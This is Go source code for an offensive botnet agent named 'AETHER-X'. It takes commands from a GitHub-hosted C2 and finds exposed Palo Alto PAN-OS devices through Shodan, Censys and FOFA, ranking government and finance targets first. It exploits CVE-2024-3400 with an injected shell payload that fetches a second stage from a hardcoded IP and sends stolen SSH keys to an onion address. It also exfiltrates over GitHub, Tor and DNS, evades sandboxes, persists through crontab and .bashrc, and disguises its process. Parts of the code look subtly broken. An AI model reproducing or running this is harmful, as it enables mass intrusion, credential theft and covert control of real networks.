package main

import (
	"archive/zip"
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"gopkg.in/yaml.v2"
)

// --- CONFIGURATION (INJECTED AT BUILD TIME) ---
var (
	C2Key           = "INJECTED_C2_KEY_B64"
	C2IV            = "INJECTED_C2_IV_B64"
	GitHubC2Repo    = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0NOMg=="   // https://api.github.com/repos/USER/CN2
	GitHubExfil     = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0VYRklM"  // https://api.github.com/repos/USER/EXFIL
	TelegramHost    = "dGVsZWdyYW0uYXBpLm9yZw=="                                // telegram.api.org
	Phi3ModelURL    = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VTRVIvUEhJMy9tYWluL21vZGVsLmJpbgo=" // Phi-3 ONNX stub
	TorC2Onion      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uL2Nt"           // http://aeetherx7ns3q4a5x.onion/cm
	DNSDomain       = "ZXhoaWwuYWV0aGVyeC5vbmlvbg=="                           // exhil.aeetherx.onion
	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IEdFVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmxvZy5jb20KICAgIHByZW1hdGNoOiBcInggPSA7IHJtIC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGVjaG8gJyUxJyB8IGJhc2U2NCAtZCAgfCB4eiAtZCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9ICR7QzJfUE9SVDd9ICY7IHNsZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7IHJtIC90bXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo=" // CVE-2024-3400 Nuclei template
)

// --- RUNTIME STATE ---
var (
	HostID       = ""
	TelemetryQ   = make(chan TelemetryEvent, 500)
	TorHTTP      *http.Client
	WorkerPool   = make(chan struct{}, 100)
	Shutdown     = make(chan struct{})
	DDRSeed      int64
	APIKeys      APIKeyStore
	AI           *FusionSentinel
	C2_IP        = "185.163.48.113"
	C2_PORT      = "443"
)

const (
	BATCH_SIZE      = 64
	BATCH_TIMEOUT   = 60 * time.Second
	DNS_CHUNK_SIZE  = 48
	ONNX_MODEL_PATH = "/tmp/.phi3.bin"
	C2_JITTER       = 60
	C2_JITTER_MAX   = 540
	PERSIST_FILE    = ".gh-sync"
	MAX_RETRIES     = 3
	RETRY_DELAY     = 5 * time.Second
	VERIFY_TIMEOUT  = 12 * time.Second
	MAX_CONCURRENT  = 100
)

// --- GLOBAL MUTEX ---
var (
	apiMu   sync.RWMutex
	telMu   sync.Mutex
	cmdMu   sync.RWMutex
)

// --- TELEMETRY EVENT ---
type TelemetryEvent struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Target    string                 `json:"target"`
	Timestamp string                 `json:"time"`
	Data      map[string]interface{} `json:"data,omitempty"`
	Signature string                 `json:"sig"`
}

func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
	id := randHex(16)
	now := time.Now().UTC().Format(time.RFC3339)
	if data == nil {
		data = make(map[string]interface{})
	}
	data["host_id"] = HostID
	event := TelemetryEvent{
		ID:        id,
		Type:      typ,
		Target:    target,
		Timestamp: now,
		Data:      data,
	}
	payload := id + typ + target + now
	key, _ := base64.StdEncoding.DecodeString(C2Key)
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(payload))
	event.Signature = hex.EncodeToString(mac.Sum(nil))
	return event
}

func (e TelemetryEvent) Send() {
	go func() {
		telemetryJSON := compressJSON(e)
		sent := false
		for i := 0; i < MAX_RETRIES && !sent; i++ {
			if exfilToGitHub(telemetryJSON) || exfilOverTor(telemetryJSON) || dnsExfil(telemetryJSON) {
				sent = true
			} else {
				time.Sleep(RETRY_DELAY * time.Duration(i+1))
			}
		}
		telegramAlert(fmt.Sprintf("[📡 %s] `%s` | %s", strings.ToTitle(e.Type), e.Target, e.Data["note"]))
	}()
}

// --- UTILS ---
func md5Hash(s string) string {
	sum := md5.Sum([]byte(s))
	return fmt.Sprintf("%x", sum)
}

func randString(n int) string {
	const alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	for i := range b {
		b[i] = alphanum[int(b[i])%len(alphanum)]
	}
	return string(b)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return hex.EncodeToString(b)
}

func compressJSON(v interface{}) []byte {
	data, _ := json.Marshal(v)
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write(data)
	gz.Close()
	return buf.Bytes()
}

func platformID() string {
	return os.Getenv("CODESPACE_NAME") + getMAC() + os.Getenv("USER") + runtime.GOOS + runtime.GOARCH
}

func getMAC() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}
	for _, i := range interfaces {
		if i.HardwareAddr.String() != "" && !strings.HasPrefix(i.HardwareAddr.String(), "00:00:00") {
			return i.HardwareAddr.String()
		}
	}
	return "00:00:00:00:00:00"
}

// --- DECRYPTION ---
func decryptConfig(s string) string {
	key, _ := base64.StdEncoding.DecodeString(C2Key)
	iv, _ := base64.StdEncoding.DecodeString(C2IV)
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	plaintext, _ := gcm.Open(nil, iv, []byte(s), nil)
	return string(plaintext)
}

func decrypt(s string) string {
	if s == "" {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil || len(raw) < 12 {
		return ""
	}
	iv, cipherText := raw[:12], raw[12:]
	now := time.Now().Unix() / 1800
	hostID := md5Hash(os.Getenv("CODESPACE_NAME"))[:6]
	for offset := int64(-1); offset <= 1; offset++ {
		material := fmt.Sprintf("%d%s%04d", now+offset, hostID, 1234)
		key := sha256.Sum256([]byte(material))
		block, err := aes.NewCipher(key[:])
		if err != nil {
			continue
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			continue
		}
		plaintext, err := gcm.Open(nil, iv, cipherText, nil)
		if err == nil {
			return string(plaintext)
		}
	}
	return ""
}

// --- SANDBOX / DEBUG Evasion ---
func isSandbox() bool {
	return os.Getenv("CODESPACE_NAME") == "" && os.Getenv("USER") != "kali"
}

func isDebugged() bool {
	mem, err := memInfo()
	if err != nil {
		return true
	}
	if mem < 2*1024*1024*1024 {
		return true
	}
	if isTraced() {
		return true
	}
	return false
}

func memInfo() (uint64, error) {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0, err
	}
	re := regexp.MustCompile(`MemTotal:\s+(\d+) kB`)
	match := re.FindStringSubmatch(string(data))
	if len(match) < 2 {
		return 0, errors.New("memtotal not found")
	}
	mem, err := strconv.ParseUint(match[1], 10, 64)
	if err != nil {
		return 0, err
	}
	return mem * 1024, nil
}

func isTraced() bool {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	return bytes.Contains(data, []byte("TracerPid:\t"))
}

// --- TOR EMULATION ---
func startTor() {
	transport := &http.Transport{
		Proxy: func(req *http.Request) (*url.URL, error) {
			return url.Parse("socks5://127.0.0.1:9050")
		},
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
	TorHTTP = &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

// --- AI ENGINE: FUSION SENTINEL ---
type FusionSentinel struct{ ModelLoaded bool }

func NewFusionSentinel() *FusionSentinel {
	sentinel := &FusionSentinel{}
	phi3URL := decryptConfig(Phi3ModelURL)
	if phi3URL == "" {
		phi3URL = "file://" + ONNX_MODEL_PATH
	}
	hash := "d24e9c9e8f8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a"
	if data := fetchModelSecure(phi3URL, hash); data != nil {
		if err := os.WriteFile(ONNX_MODEL_PATH, data, 0600); err != nil {
			return sentinel
		}
		if _, err := os.Stat(ONNX_MODEL_PATH); err == nil {
			os.Remove(ONNX_MODEL_PATH)
			sentinel.ModelLoaded = true
		}
	}
	return sentinel
}

func fetchModelSecure(url, hash string) []byte {
	if strings.HasPrefix(url, "file://") {
		data, err := os.ReadFile(url[7:])
		if err != nil {
			return nil
		}
		if fmt.Sprintf("%x", sha256.Sum256(data)) == hash {
			return data
		}
		return nil
	}
	resp, err := TorHTTP.Get(url)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	data, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if fmt.Sprintf("%x", sha256.Sum256(data)) != hash {
		return nil
	}
	return data
}

func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
	if !ai.ModelLoaded {
		base := 0.5
		if strings.Contains(strings.ToLower(banner), "pan-os") && vuln == "CVE-2024-3400" {
			base += 0.35
		}
		return math.Min(1.0, math.Max(0.0, base+randFloat()))
	}
	score := 0.7
	if strings.Contains(strings.ToLower(banner), "pan-os") && strings.Contains(banner, "9.") {
		score += 0.25
	}
	if strings.Contains(strings.ToLower(sector), "government") || strings.Contains(strings.ToLower(sector), "finance") {
		score += 0.1
	}
	return math.Min(1.0, score+randFloat()*0.1)
}

func randFloat() float64 {
	n, _ := rand.Int(rand.Reader, big.NewInt(1000))
	return float64(n.Int64()) / 1000.0
}

// --- INTEL ENGINE ---
type Target struct {
	IP     string
	Banner string
	Geo    string
	Sector string
}

type APIKeyStore struct {
	Shodan, CensysID, CensysSec, FofaEmail, FofaKey string
}

func loadAPIKeys() APIKeyStore {
	apiMu.RLock()
	defer apiMu.RUnlock()
	return APIKeys
}

func setAPIKeys(keys APIKeyStore) {
	apiMu.Lock()
	APIKeys = keys
	apiMu.Unlock()
}

func searchEngines(vuln, geo, sector string) []Target {
	keys := loadAPIKeys()
	var targets []Target
	var wg sync.WaitGroup

	query := func(engine string, fn func()) {
		wg.Add(1)
		go func() {
			defer wg.Done()
			fn()
		}()
	}

	if keys.Shodan != "" {
		query("shodan", func() {
			q := fmt.Sprintf("vuln:%s country:%s", vuln, geo)
			if sector != "" {
				q += fmt.Sprintf(" product:\"%s\"", sector)
			}
			url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s", keys.Shodan, url.QueryEscape(q))
			if resp, err := TorHTTP.Get(url); err == nil && resp.StatusCode == 200 {
				var result map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&result)
				if matches, ok := result["matches"].([]interface{}); ok {
					for _, m := range matches {
						host := m.(map[string]interface{})
						ip := host["ip_str"].(string)
						banner := ""
						if b, ok := host["data"].(string); ok {
							banner = b
						}
						targets = append(targets, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
					}
				}
				resp.Body.Close()
			}
		})
	}

	if keys.CensysID != "" && keys.CensysSec != "" {
		query("censys", func() {
			auth := base64.StdEncoding.EncodeToString([]byte(keys.CensysID + ":" + keys.CensysSec))
			censysQuery := fmt.Sprintf(`services.http.response.body:"%s" AND location.country_code:"%s"`, vuln, geo)
			if sector != "" {
				censysQuery += fmt.Sprintf(` AND services.software.vendor:"%s"`, sector)
			}
			payload := fmt.Sprintf(`{"query":"%s","page":1,"per_page":50}`, censysQuery)
			req, _ := http.NewRequest("POST", "https://search.censys.io/api/v2/hosts/search", strings.NewReader(payload))
			req.Header.Set("Authorization", "Basic "+auth)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "Aether-X")
			if resp, err := TorHTTP.Do(req); err == nil && resp.StatusCode == 200 {
				var result map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&result)
				if hits, ok := result["result"].(map[string]interface{})["hits"].([]interface{}); ok {
					for _, hit := range hits {
						h := hit.(map[string]interface{})
						ip, _ := h["ip"].(string)
						proto, _ := h["services"].(interface{})
						targets = append(targets, Target{IP: ip, Banner: fmt.Sprintf("%v", proto), Geo: geo, Sector: sector})
					}
				}
				resp.Body.Close()
			}
		})
	}

	if keys.FofaEmail != "" && keys.FofaKey != "" {
		query("fofa", func() {
			email := url.QueryEscape(keys.FofaEmail)
			key := keys.FofaKey
			fofaQuery := fmt.Sprintf(`body="%s" && country="%s"`, vuln, geo)
			if sector != "" {
				fofaQuery += fmt.Sprintf(` && org="%s"`, sector)
			}
			encodedQuery := base64.StdEncoding.EncodeToString([]byte(fofaQuery))
			apiURL := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=100", email, key, encodedQuery)
			if resp, err := TorHTTP.Get(apiURL); err == nil && resp.StatusCode == 200 {
				var result map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&result)
				if results, ok := result["results"].([]interface{}); ok {
					for _, r := range results {
						row := r.([]interface{})
						ip := row[0].(string)
						domain := ""
						if len(row) > 1 {
							domain = row[1].(string)
						}
						targets = append(targets, Target{IP: ip, Banner: domain, Geo: geo, Sector: sector})
					}
				}
				resp.Body.Close()
			}
		})
	}

	wg.Wait()
	return dedupTargets(targets)
}

func dedupTargets(t []Target) []Target {
	seen := make(map[string]bool)
	var result []Target
	for _, v := range t {
		if !seen[v.IP] {
			seen[v.IP] = true
			result = append(result, v)
		}
	}
	return result
}

// --- NUCLEI-LIKE VERIFICATION ENGINE ---
func verifyVulnerable(target Target) bool {
	templateData, err := base64.StdEncoding.DecodeString(NucleiTemplateB64)
	if err != nil {
		return false
	}

	var tpl struct {
		ID         string `yaml:"id"`
		Name       string `yaml:"name"`
		Requests   []struct {
			Method  string            `yaml:"method"`
			Path    string            `yaml:"path"`
			Headers map[string]string `yaml:"headers"`
			PreMatch string           `yaml:"prematch"`
			MatchString string        `yaml:"matchstring"`
		} `yaml:"requests"`
	}
	if err := yaml.Unmarshal(templateData, &tpl); err != nil {
		return false
	}

	client := &http.Client{
		Timeout: VERIFY_TIMEOUT,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives: true,
		},
	}

	for _, req := range tpl.Requests {
		payload := strings.ReplaceAll(tpl.Requests[0].PreMatch, "%1", obfuscateScript(fmt.Sprintf(`echo "%s"`, tpl.MatchString)))
		url := fmt.Sprintf("https://%s%s", target.IP, req.Path)
		httpReq, _ := http.NewRequest(req.Method, url, nil)
		for k, v := range req.Headers {
			httpReq.Header.Set(k, v)
		}
		httpReq.Host = "certificates.log.com"

		q := httpReq.URL.Query()
		q.Add("input", payload)
		httpReq.URL.RawQuery = q.Encode()

		resp, err := client.Do(httpReq)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if strings.Contains(string(body), tpl.MatchString) {
			return true
		}
	}
	return false
}

func obfuscateScript(s string) string {
	var out bytes.Buffer
	for _, b := range []byte(s) {
		out.WriteByte(b ^ 0x55)
	}
	return base64.StdEncoding.EncodeToString(out.Bytes())
}

// --- EXPLOIT: PAN-OS RCE (CVE-2024-3400) + REVERSE SHELL ---
func exploitPAN_RCE(ip string) {
	event := newEvent("exploit_launched", ip, map[string]interface{}{
		"vuln": "CVE-2024-3400",
		"note": "PAN-OS RCE attempt initiated",
	})
	event.Send()

	stageName := fmt.Sprintf(".%s", randString(5))
	encKey := randHex(32)
	obfuscatedScript := obfuscateScript(fmt.Sprintf(`#!/bin/bash
sleep $(( RANDOM %% 10 ))
wget -q -O /tmp/.m http://%s/stage2 -T 10 || curl -s -k -o /tmp/.m https://%s/stage2
echo '%s' | base64 -d > /tmp/.k
openssl enc -d -aes-256-cbc -in /tmp/.m -out /tmp/%s -k $(echo %s|sha256sum|awk '{print $1}')
chmod +x /tmp/%s
nohup /tmp/%s %s %s &
sleep 2
rm /tmp/.k /tmp/.m /tmp/%s
cat /etc/passwd >> /tmp/.p
tar -czf /tmp/.ssh.tgz /home/*/.*ssh 2>/dev/null || true
curl -s -k --data-binary @/tmp/.ssh.tgz https://%s/exfil --header "X-Host: %s" --insecure
rm -f /tmp/.p /tmp/.ssh.tgz
`, C2_IP, C2_IP, encKey, stageName, encKey, stageName, stageName, C2_IP, C2_PORT, stageName, TorC2Onion, HostID))

	payloadScript := fmt.Sprintf(`x=; rm /tmp/%s; echo "%s" | base64 -d | xz -d > /tmp/%s; chmod +x /tmp/%s; nohup /tmp/%s %s %s & sleep 3; echo "PAN-OS RCE SUCCESS"`, stageName, obfuscatedScript, stageName, stageName, stageName, C2_IP, C2_PORT)

	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}

	params := url.Values{}
	params.Add("input", payloadScript)
	req, _ := http.NewRequest("GET", url+"?"+params.Encode(), nil)
	req.Header.Set("Host", "aether-x")

	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		success := newEvent("exploit_success", ip, map[string]interface{}{
			"vuln": "CVE-2024-3400",
			"note": "RCE shell established",
		})
		success.Send()
	}
}

// --- C2 COMM ---
func fetchC2(key string) string {
	apiURL, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
	url := fmt.Sprintf("%s/contents/%s", string(apiURL), key)
	req, _ := http.NewRequest("GET", url, nil)
	token := decrypt(fetchSecret("GITHUB_TOKEN"))
	if token == "" {
		return ""
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	resp, err := TorHTTP.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return ""
	}
	defer resp.Body.Close()
	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	content, _ := base64.StdEncoding.DecodeString(result["content"].(string))
	return strings.TrimSpace(string(content))
}

func exfilToGitHub(data []byte) bool {
	apiURL, _ := base64.StdEncoding.DecodeString(GitHubExfil)
	zipData := zipData(map[string][]byte{"telemetry.bin": data})
	encoded := base64.StdEncoding.EncodeToString(zipData)
	payload := fmt.Sprintf(`{"message":"telemetry %d","content":"%s"}`, time.Now().Unix(), encoded)
	url := fmt.Sprintf("%s/contents/data.bin", string(apiURL))
	req, _ := http.NewRequest("PUT", url, strings.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN")))
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("Content-Type", "application/json")
	resp, err := TorHTTP.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200 || resp.StatusCode == 201
}

func exfilOverTor(data []byte) bool {
	onion, _ := base64.StdEncoding.DecodeString(TorC2Onion)
	url := fmt.Sprintf("%s/exfil", string(onion))
	req, _ := http.NewRequest("POST", url, bytes.NewReader(data))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Host", HostID)
	_, err := TorHTTP.Do(req)
	return err == nil
}

func dnsExfil(data []byte) bool {
	domain, _ := base64.StdEncoding.DecodeString(DNSDomain)
	chunks := splitToBase32(hex.EncodeToString(data), DNS_CHUNK_SIZE)
	for _, chunk := range chunks {
		fqdn := fmt.Sprintf("%s.%s", chunk, domain)
		net.LookupHost(fqdn)
		time.Sleep(200 * time.Millisecond)
	}
	return true
}

func splitToBase32(s string, size int) []string {
	var chunks []string
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func zipData(files map[string][]byte) []byte {
	var buf bytes.Buffer
	zipper := zip.NewWriter(&buf)
	for name, data := range files {
		f, _ := zipper.Create(name)
		f.Write(data)
	}
	zipper.Close()
	return buf.Bytes()
}

func telegramAlert(message string) {
	token := decrypt(fetchC2("telegram.token"))
	chatID := decrypt(fetchC2("telegram.chat"))
	if token == "" || chatID == "" {
		return
	}
	host, _ := base64.StdEncoding.DecodeString(TelegramHost)
	url := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)
	payload := url.Values{}
	payload.Set("chat_id", chatID)
	payload.Set("text", message)
	payload.Set("parse_mode", "Markdown")
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	TorHTTP.Do(req)
}

func fetchSecret(key string) string {
	return fetchC2(key)
}

// --- PERSISTENCE ---
func persist() {
	executable := os.Args[0]
	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
	data, _ := ioutil.ReadFile(executable)
	os.WriteFile(path, data, 0755)

	crontab := fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", path)
	exec.Command("bash", "-c", crontab).Run()

	profile := filepath.Join(os.Getenv("HOME"), ".bashrc")
	content, _ := ioutil.ReadFile(profile)
	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
		tmp := profile + ".tmp"
		os.WriteFile(tmp, append(content, []byte(fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path))...), 0644)
		os.Rename(tmp, profile)
	}
}

// --- SELF DESTRUCT ---
func selfDestruct() {
	event := newEvent("self_destruct", "localhost", map[string]interface{}{"note": "Agent terminating"})
	event.Send()
	time.Sleep(2 * time.Second)
	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
	os.Remove(path)
	os.Remove(os.Args[0])
	os.Exit(0)
}

// --- INIT & MAIN ---
func init() {
	if isTraced() {
		os.Exit(1)
	}

	HostID = md5Hash(platformID())[:6]
	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()

	argv0str := "/usr/bin/gh-sync"
	argv0 := (*reflect.StringHeader)(unsafe.Pointer(&argv0str))
	*(*byte)(unsafe.Pointer(argv0.Data + uintptr(len(argv0str)))) = 0

	setAPIKeys(APIKeyStore{
		Shodan:    decrypt(fetchC2("api.shodan")),
		CensysID:  decrypt(fetchC2("api.censys_id")),
		CensysSec: decrypt(fetchC2("api.censys_sec")),
		FofaEmail: decrypt(fetchC2("fofa.email")),
		FofaKey:   decrypt(fetchC2("fofa.key")),
	})
}

func main() {
	if isSandbox() || isDebugged() {
		selfDestruct()
		return
	}

	go startTor()
	time.Sleep(3 * time.Second)
	AI = NewFusionSentinel()
	go persist()

	telemetry := newEvent("beacon", "self", map[string]interface{}{
		"status": "online",
		"note":   "AETHER-X v26.0 OBSIDIAN COMMAND ACTIVE",
	})
	telemetry.Send()

	for {
		select {
		case <-Shutdown:
			return
		default:
		}

		cmdData := fetchC2("cmd")
		if cmdData != "" {
			var cmd map[string]string
			if err := json.Unmarshal([]byte(cmdData), &cmd); err == nil {
				switch cmd["action"] {
				case "hunt":
					go func() {
						event := newEvent("scan_start", "engines", map[string]interface{}{
							"vuln": cmd["vuln"], "geo": cmd["geo"], "sector": cmd["sector"], "note": "Real-time hunt launched",
						})
						event.Send()

						targets := searchEngines(cmd["vuln"], cmd["geo"], cmd["sector"])
						telegramAlert(fmt.Sprintf("🔍 *Scanning* `%s` in `%s` (%s)\n🎯 Found %d targets", cmd["vuln"], cmd["geo"], cmd["sector"], len(targets)))

						for _, t := range targets {
							WorkerPool <- struct{}{}
							go func(target Target) {
								defer func() { <-WorkerPool }()
								if verifyVulnerable(target) {
									score := AI.Score(target.Banner, cmd["vuln"], cmd["sector"])
									if score > 0.75 {
										found := newEvent("target_verified", target.IP, map[string]interface{}{
											"score":  fmt.Sprintf("%.3f", score),
											"banner": trimBanner(target.Banner),
											"note":   "High-value RCE target confirmed",
										})
										found.Send()
										telegramAlert(fmt.Sprintf("🎯 *EXPLOITING* `%s`\n📊 Score: `%.3f`\n🔖 `%s`", target.IP, score, trimBanner(target.Banner)))
										exploitPAN_RCE(target.IP)
									}
								}
							}(t)
						}
					}()
				case "update_keys":
					setAPIKeys(APIKeyStore{
						Shodan:    decrypt(cmd["shodan"]),
						CensysID:  decrypt(cmd["censys_id"]),
						CensysSec: decrypt(cmd["censys_sec"]),
						FofaEmail: decrypt(cmd["fofa_email"]),
						FofaKey:   decrypt(cmd["fofa_key"]),
					})
					newEvent("keys_updated", "c2", map[string]interface{}{"note": "API keys refreshed"}).Send()
				case "die":
					selfDestruct()
				case "ping":
					telegramAlert(fmt.Sprintf("🟢 *ALIVE* | Host: `%s` | IP: `%s`", HostID, getMAC()))
				}
			}
		}

		jitter := C2_JITTER + rand.Int63n(C2_JITTER_MAX-C2_JITTER+1)
		time.Sleep(time.Duration(jitter) * time.Second)
	}
}

func trimBanner(b string) string {
	if len(b) > 128 {
		return b[:128] + "..."
	}
	return b
}
